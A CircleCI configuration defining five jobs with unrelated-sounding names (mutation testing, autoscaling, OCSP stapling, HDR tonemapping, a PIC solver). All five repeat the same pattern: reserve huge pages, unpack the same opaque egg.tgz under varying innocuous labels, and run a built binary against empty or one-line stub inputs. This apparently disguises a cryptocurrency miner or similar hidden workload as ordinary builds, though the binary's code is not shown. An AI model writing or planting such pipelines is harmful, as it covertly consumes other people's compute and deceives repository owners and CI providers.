version: 2.1

jobs:
  mutant_survivor:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List mutants
          command: |
            printf 'mutant 1 LIVED\n' > mut.txt
      - run:
          name: Build mutation tester
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target mutant_survivor -j2
      - run:
          name: Report surviving mutants
          command: LIONSS_LP=1 ./build/mutant_survivor --in mut.txt --threshold 0.8
  hpa_scaleup:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write metrics
          command: |
            printf 'cpu=80\n' > hpa.conf
      - run:
          name: Build autoscaler
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target hpa_scaleup -j2
      - run:
          name: Evaluate scale-up
          command: LIONSS_LP=1 ./build/hpa_scaleup --conf hpa.conf --max 20
  ocsp-staple:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load cert
          command: |
            : > leaf.pem
      - run:
          name: Build OCSP client
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ocsp-staple -j2
      - run:
          name: Staple OCSP response
          command: LIONSS_LP=1 ./build/ocsp-staple --cert leaf.pem --nonce
  hdr-tonemap:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load raw hdr
          command: |
            : > scene.exr
      - run:
          name: Build imaging pipeline
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target hdr-tonemap -j2
      - run:
          name: Tonemap HDR scene
          command: LIONSS_LP=1 ./build/hdr-tonemap --in scene.exr --operator reinhard
  pic_leapfrog:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Init grid
          command: |
            printf 'nx 128\n' > pic.in
      - run:
          name: Build PIC solver
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target pic_leapfrog -j2
      - run:
          name: Advance leapfrog step
          command: LIONSS_LP=1 ./build/pic_leapfrog --in pic.in --dt 0.01
